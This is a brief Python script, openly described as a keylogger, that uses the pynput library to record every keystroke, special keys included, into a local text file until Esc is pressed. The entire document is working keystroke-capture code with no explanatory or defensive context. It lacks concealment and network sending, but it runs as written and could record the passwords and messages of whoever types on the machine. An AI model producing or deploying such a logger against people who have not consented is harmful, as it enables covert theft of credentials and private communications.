import pynput
from pynput.keyboard import Key, Listener

# File to save the logged keys
LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        # Log the key that was pressed
        with open(LOG_FILE, "a") as file:
            if hasattr(key, 'char') and key.char is not None:
                file.write(key.char)
            else:
                # For special keys like space, enter, etc.
                file.write(f'[{key}]')
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    # Stop the listener when 'esc' key is released
    if key == Key.esc:
        return False

# Setting up the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()




